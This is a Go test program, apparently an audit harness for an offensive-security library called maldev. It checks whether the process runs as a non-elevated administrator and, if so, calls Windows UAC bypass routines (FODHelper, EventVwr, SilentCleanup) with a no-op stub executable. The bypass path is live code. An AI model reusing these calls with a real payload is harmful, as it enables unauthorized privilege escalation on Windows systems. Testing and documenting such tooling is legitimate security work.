//go:build windows

// privesc-uac — panorama 8 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/privesc/uac.md      — FODHelper / SilentCleanup / EventVwr
//   - docs/techniques/win/version.md      — Current() + AtLeast()
//
// Tests UAC bypass primitives in a controlled way: each call is gated on
// `privilege.IsAdmin` so the audit captures the pre-flight branch the
// "Composed" example shows. We never actually hand them a real payload —
// the file under `path` is a tiny no-op .exe — and we wait briefly to
// let the helper read it, then clean up.
//
// Expected matrix outcome:
//   - admin already-elevated  → "not a UAC scenario" (correct early-out).
//   - lowuser                 → "not a UAC scenario" (no admin group at all).
// To actually exercise FODHelper one would need a Medium-IL admin shell,
// which neither matrix cell provides; this panorama therefore captures
// the gating logic + API surface, not a true elevation.
package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/privesc/uac"
	"github.com/oioio-space/maldev/win/privilege"
	"github.com/oioio-space/maldev/win/version"
)

func main() {
	// 1. Pre-flight (uac.md "Composed").
	fmt.Println("=== Pre-flight ===")
	admin, elevated, err := privilege.IsAdmin()
	if err != nil {
		fmt.Printf("IsAdmin err: %v\n", err)
		return
	}
	fmt.Printf("admin-group=%v elevated=%v\n", admin, elevated)

	v := version.Current()
	fmt.Printf("windows build: %d\n", v.BuildNumber)

	// 2. Branch logic from the doc.
	if elevated || !admin {
		fmt.Println("not a UAC scenario — skipping bypass calls")
		// Still touch the API surface for compile-time evidence.
		fmt.Printf("  uac.FODHelper signature OK (skipped, would need Medium-IL admin)\n")
		_ = uac.FODHelper
		_ = uac.SilentCleanup
		_ = uac.EventVwr
		_ = uac.SLUI
		return
	}

	// 3. Real bypass path — only fires when running as a Medium-IL admin
	//    (typical RDP/explorer admin shell that has not consented to UAC).
	//    Drop a no-op payload first so the helper has a real .exe to read.
	payload := `C:\Users\Public\maldev\panorama8-noop.exe`
	if err := os.WriteFile(payload, []byte{0x4D, 0x5A}, 0o755); err != nil {
		fmt.Printf("write payload: %v\n", err)
		return
	}
	defer os.Remove(payload)

	fmt.Println("\n=== UAC bypass ===")
	switch {
	case version.AtLeast(version.WINDOWS_10_22H2):
		err = uac.FODHelper(payload)
		fmt.Printf("FODHelper: %v\n", err)
	case v.BuildNumber >= 7600 && v.BuildNumber < 17134:
		err = uac.EventVwr(payload)
		fmt.Printf("EventVwr: %v\n", err)
	default:
		err = uac.SilentCleanup(payload)
		fmt.Printf("SilentCleanup: %v\n", err)
	}
}
